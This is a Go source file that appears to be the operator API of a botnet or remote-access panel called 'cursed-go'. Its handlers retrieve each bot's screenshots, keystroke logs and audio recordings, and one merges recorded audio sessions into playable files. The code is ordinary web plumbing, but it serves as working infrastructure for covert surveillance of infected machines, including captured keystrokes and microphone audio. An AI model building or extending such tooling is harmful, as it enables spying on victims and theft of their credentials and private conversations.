package api

import (
	"encoding/base64"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"gorm.io/gorm"

	"github.com/s045pd/cursed-go/internal/db/models"
)

// MediaAPI groups screenshot, keyboard log and recording routes.
type MediaAPI struct {
	DB *gorm.DB
}

func parseLimitOffset(r *http.Request, defLimit int) (int, int) {
	q := r.URL.Query()
	limit, _ := strconv.Atoi(q.Get("limit"))
	if limit <= 0 || limit > 500 {
		limit = defLimit
	}
	offset, _ := strconv.Atoi(q.Get("offset"))
	if offset < 0 {
		offset = 0
	}
	return limit, offset
}

// Screenshots is GET /api/v1/screenshots?id=<bot_id>&limit=&offset=
func (a *MediaAPI) Screenshots(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(r.URL.Query().Get("id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	limit, offset := parseLimitOffset(r, 50)
	var rows []models.BotScreenshot
	if err := a.DB.Where("bot_id = ?", id).
		Order("timestamp DESC").Limit(limit).Offset(offset).Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	JSONOK(w, rows)
}

// KeyboardLogs is GET /api/v1/keyboard-logs?id=&limit=&offset=&startTime=&endTime=
func (a *MediaAPI) KeyboardLogs(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(r.URL.Query().Get("id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	limit, offset := parseLimitOffset(r, 50)
	tx := a.DB.Where("bot_id = ?", id)
	if v := r.URL.Query().Get("startTime"); v != "" {
		if t, err := time.Parse(time.RFC3339, v); err == nil {
			tx = tx.Where("timestamp >= ?", t)
		}
	}
	if v := r.URL.Query().Get("endTime"); v != "" {
		if t, err := time.Parse(time.RFC3339, v); err == nil {
			tx = tx.Where("timestamp <= ?", t)
		}
	}
	var rows []models.BotKeyboardLog
	if err := tx.Order("timestamp DESC").Limit(limit).Offset(offset).Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	JSONOK(w, rows)
}

// Recordings is GET /api/v1/recordings?id=<bot_id>
func (a *MediaAPI) Recordings(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(r.URL.Query().Get("id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	var rows []models.BotRecording
	if err := a.DB.Where(`"bot" = ?`, id).Order("timestamp DESC").Limit(500).Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	JSONOK(w, rows)
}

type audioSession struct {
	SessionID  string    `json:"session_id"`
	StartTime  time.Time `json:"start_time"`
	EndTime    time.Time `json:"end_time"`
	ChunkCount int       `json:"chunk_count"`
}

// AudioSessions is GET /api/v1/audio-sessions?id=<bot_id>
func (a *MediaAPI) AudioSessions(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(r.URL.Query().Get("id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	// MIN/MAX(timestamp) on sqlite comes back as string; postgres returns
	// time.Time. Use string + parse to stay portable.
	type aggRow struct {
		SessionID  string
		StartTime  string
		EndTime    string
		ChunkCount int
	}
	var rows []aggRow
	err = a.DB.Model(&models.BotRecording{}).
		Select(`session_id as session_id,
                MIN(timestamp) as start_time,
                MAX(timestamp) as end_time,
                COUNT(*) as chunk_count`).
		Where(`"bot" = ? AND session_id IS NOT NULL AND session_id != ''`, id).
		Group("session_id").
		Order("MAX(timestamp) DESC").
		Scan(&rows).Error
	if err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	out := make([]audioSession, 0, len(rows))
	for _, r := range rows {
		out = append(out, audioSession{r.SessionID, parseTime(r.StartTime), parseTime(r.EndTime), r.ChunkCount})
	}
	JSONOK(w, out)
}

func parseTime(s string) time.Time {
	for _, layout := range []string{
		time.RFC3339Nano, time.RFC3339,
		"2006-01-02 15:04:05.999999999-07:00",
		"2006-01-02 15:04:05.999999999",
		"2006-01-02 15:04:05",
	} {
		if t, err := time.Parse(layout, s); err == nil {
			return t
		}
	}
	return time.Time{}
}

// AudioSessionMerge is GET /api/v1/audio-session/{session_id}
// Concatenates all chunks of a session into one audio/webm response.
func (a *MediaAPI) AudioSessionMerge(w http.ResponseWriter, r *http.Request) {
	sid := chi.URLParam(r, "session_id")
	if sid == "" {
		JSONErr(w, http.StatusBadRequest, "session_id required")
		return
	}
	var rows []models.BotRecording
	if err := a.DB.Where("session_id = ?", sid).Order("timestamp ASC").Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	if len(rows) == 0 {
		JSONErr(w, http.StatusNotFound, "session not found")
		return
	}
	var buf strings.Builder
	for _, row := range rows {
		buf.WriteString(row.Recording)
	}
	merged, err := base64.StdEncoding.DecodeString(buf.String())
	if err != nil {
		// not base64 — return as is
		w.Header().Set("Content-Type", "audio/webm")
		_, _ = w.Write([]byte(buf.String()))
		return
	}
	w.Header().Set("Content-Type", "audio/webm")
	_, _ = w.Write(merged)
}

// AudioChunk is GET /api/v1/audio/{id}
// Returns a single recording row decoded from base64.
func (a *MediaAPI) AudioChunk(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(chi.URLParam(r, "id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	var row models.BotRecording
	if err := a.DB.Where("id = ?", id).First(&row).Error; err != nil {
		JSONErr(w, http.StatusNotFound, "recording not found")
		return
	}
	data, err := base64.StdEncoding.DecodeString(row.Recording)
	if err != nil {
		w.Header().Set("Content-Type", "audio/webm")
		_, _ = w.Write([]byte(row.Recording))
		return
	}
	w.Header().Set("Content-Type", "audio/webm")
	_, _ = w.Write(data)
}
